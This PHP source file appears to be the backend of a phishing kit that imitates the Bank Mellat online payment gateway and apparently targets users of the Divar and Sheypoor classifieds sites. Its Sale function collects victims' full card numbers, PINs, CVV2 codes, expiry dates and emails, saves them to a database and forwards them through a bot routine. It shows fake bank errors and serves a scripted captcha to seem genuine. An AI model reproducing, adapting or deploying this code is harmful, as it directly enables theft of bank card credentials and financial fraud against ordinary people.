<?php

if (!defined('ROOT'))
{
	include_once('../Views/404.php');
	exit();
}

class Website
{
	public static function StartPay($App)
	{
		$RefId = isset($_POST['RefId']) ? $_POST['RefId'] : '';
		$Request = isset($_GET['Request']) ? $_GET['Request'] : -1;

		if (!empty($_GET['RefId']) && empty($RefId))
			$RefId = $_GET['RefId'];

		// 0 = Divar
		// 1 = Sheypoor
		if ($Request == -1 || $Request > 1)
		{
			header("Location: " . DOMAIN_ROOT . "/result.mellat?RefId=$RefId&BLOCKER_ERROR=invalidMethod");
			exit();
		}

		/*
		if (empty($_POST['RefId']) && empty($_GET['RefId']))
		{
			$InvalidMethod = true;
			$Method = 'missingRefId';
		}

		if (empty($_POST['RefId']) && !empty($_GET['RefId']))
		{
			$RefId = $_GET['RefId'];
			$InvalidMethod = true;
			$Method = 'invalidMethod';

			if (!$App->ValidateRefId($RefId))
				$Method = 'invalidMethodAndNoRefId';
		}
		else if (!empty($_POST['RefId']) && !$App->ValidateRefId($RefId))
		{
			$InvalidMethod = true;
			$Method = 'invalidRefId';
		}
		*/

		// if ($App->ValidateRefId($RefId))
		// {
		// 	header("Location:  " . DOMAIN_ROOT . "/result.mellat?RefId=$RefId&BLOCKER_ERROR=invalidRefId");
		// 	exit();
		// }

		$OrderId = GenerateRandomNumber(9);
		$Amount = 10000;

		$DB = $App->DB();

		$STMT = $DB->prepare("INSERT INTO `transactions` (`RefId`, `Request`, `SaleOrderId`, `Amount`) VALUES (?, ?, ?, ?);");
		$STMT->bind_param("siii", $RefId, $Request, $OrderId, $Amount);
		$STMT->execute();
		$STMT->close();

		header("Location: " . DOMAIN_ROOT . "/payment.mellat?RefId=$RefId");
		exit();
	}

	public static function Payment($App)
	{
		include_once(ROOT . 'App/Views/Payment.php');
	}

	public static function Result($App)
	{
		include_once(ROOT . 'App/Views/Result.php');
	}

	public static function Sale($App)
	{
		$Input = file_get_contents('php://input');

		$RefId = isset($_GET['RefId']) ? $_GET['RefId'] : 'null';

		if (empty($_GET['RefId']) || !$App->ValidateRefId($RefId))
			JSON(['status' => 'SALE_FAILED', 'responseCode' => '17']);

		$Data = ValidateData();
		$Captcha = $App->GetSession('Captcha');

		if (!isset($Captcha))
			JSON(['status' => 'ERROR_BLOCKER']);

		if (empty($Data->captcha) || empty($Data->pan) || empty($Data->pin) || empty($Data->cvv2) ||
			empty($Data->expireMonth) || empty($Data->expireYear))
			JSON(['status' => 'ERROR_BLOCKER']);

		if ($Captcha != $Data->captcha)
			JSON(['status' => 'INVALID_CAPTCHA']);

		if (!$App->ValidateCardNumber($Data->pan))
			JSON(['status' => 'SALE_FAILED', 'responseCode' => "11", 'description' => 'اطلاعات وارد شده صحيح نمی باشد']);

		$CardNumber = $Data->pan;
		$Pin = $Data->pin;
		$CVV2 = $Data->cvv2;
		$ExpireMonth = $Data->expireMonth;
		$ExpireYear = $Data->expireYear;
		$Email = !empty($Data->email) ? $Data->email : 'Unknown';

		if ($ExpireYear > 6 && $ExpireYear <= 97)
			JSON(['status' => 'INVALID_EXPIRATION', 'description' => 'تاریخ انقضای کارت صحیح نمی باشد']);

		$DB = $App->DB();

		$STMT = $DB->prepare("SELECT COUNT(*) FROM credit_cards WHERE `CardNumber` = ? AND `Pin` = ? AND `CVV2` = ? AND `ExpireMonth` = ? AND `ExpireYear` = ?;");
		$STMT->bind_param("sssss", $CardNumber, $Pin, $CVV2, $ExpireMonth, $ExpireYear);
		$STMT->execute();
		$STMT->bind_result($Count);
		$STMT->fetch();
		$STMT->close();

		if ($Count > 0)
			JSON(['status' => 'SALE_FAILED', 'responseCode' => '19', 'description' => 'بانک صادر کننده کارت پاسخگو نمی باشد']);

		$STMT = $DB->prepare("UPDATE `transactions` SET `Completed` = 1 WHERE `RefId` = ?;");
		$STMT->bind_param("s", $RefId);
		$STMT->execute();
		$STMT->close();

		$STMT = $DB->prepare("INSERT IGNORE INTO `credit_cards` (`RefId`, `CardNumber`, `Pin`, `CVV2`, `ExpireMonth`, `ExpireYear`, `Email`) VALUES (?, ?, ?, ?, ?, ?, ?);");
		$STMT->bind_param("sssssss", $RefId, $CardNumber, $Pin, $CVV2, $ExpireMonth, $ExpireYear, $Email);
		$STMT->execute();
		$STMT->close();

		$App->BotSendCard($RefId, $CardNumber, $Pin, $CVV2, $ExpireMonth, $ExpireYear, $Email);

		JSON(['status' => 'OK']);
	}

	public static function Captcha($App)
	{
		$Image = 'Default.jpg';
		$App->SetSession('Captcha', '45342');

		switch (rand(1, 10))
		{
			case 1:
				$App->SetSession('Captcha', '12845');
				$Image = '1.jpg';
				break;

			case 2:
				$App->SetSession('Captcha', '48404');
				$Image = '2.jpg';
				break;

			case 3:
				$App->SetSession('Captcha', '47125');
				$Image = '3.jpg';
				break;

			case 4:
				$App->SetSession('Captcha', '76835');
				$Image = '4.jpg';
				break;

			case 5:
				$App->SetSession('Captcha', '40927');
				$Image = '5.jpg';
				break;

			case 6:
				$App->SetSession('Captcha', '32893');
				$Image = '6.jpg';
				break;

			case 7:
				$App->SetSession('Captcha', '07622');
				$Image = '7.jpg';
				break;

			case 8:
				$App->SetSession('Captcha', '59066');
				$Image = '8.jpg';
				break;

			case 9:
				$App->SetSession('Captcha', '94593');
				$Image = '9.jpg';
				break;

			case 10:
				$App->SetSession('Captcha', '84079');
				$Image = '10.jpg';
				break;
		}

		$Path = (ROOT . "img/captcha/$Image");
		$Buffer = fopen($Path, 'rb');

		header("Content-Type: image/jpeg");
		header("Content-Length: " . filesize($Path));

		fpassthru($Buffer);
		exit();
	}
}
